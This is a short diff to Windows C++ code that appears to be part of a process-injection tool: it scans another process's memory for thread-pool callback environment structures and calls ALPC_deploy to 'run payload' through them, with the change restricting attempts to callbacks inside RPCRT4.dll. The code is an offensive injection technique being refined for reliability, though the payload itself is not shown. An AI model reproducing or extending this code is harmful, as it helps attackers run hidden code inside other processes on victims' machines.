@@ -33,6 +33,8 @@
 #include <windows.h>
 #include <tlhelp32.h>
 #include <psapi.h>
+#include <shlwapi.h>
+
 #include "ntddk.h"
 
 #include <cstdio>
@@ -42,6 +44,7 @@
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "winspool.lib")
+#pragma comment(lib, "shlwapi.lib")
 
 // this structure is derived from TP_CALLBACK_ENVIRON_V3,
 // but also includes two additional values. one to hold
@@ -367,11 +370,14 @@ BOOL FindEnviron(process_info *pi, LPVOID BaseAddress, SIZE_T RegionSize)
       if(bFound) {
         // obtain module name where callback resides
         GetMappedFileName(pi->hp, (LPVOID)cbe.Callback, filename, MAX_PATH);
-        wprintf(L"Found CBE at %p for %s\n",  addr+pos, filename);
-        // try run payload using this CBE
-        // if successful, end scan
-        bInject = ALPC_deploy(pi, addr+pos, &cbe);
-        if (bInject) break;
+        // filter by RPCRT4.dll
+        if(StrStrI(filename, L"RPCRT4.dll")!=NULL) {
+          wprintf(L"Found CBE at %p for %s\n",  addr+pos, filename);
+          // try run payload using this CBE
+          // if successful, end scan
+          bInject = ALPC_deploy(pi, addr+pos, &cbe);
+          if (bInject) break;
+        }
       }
     }
     return bInject;
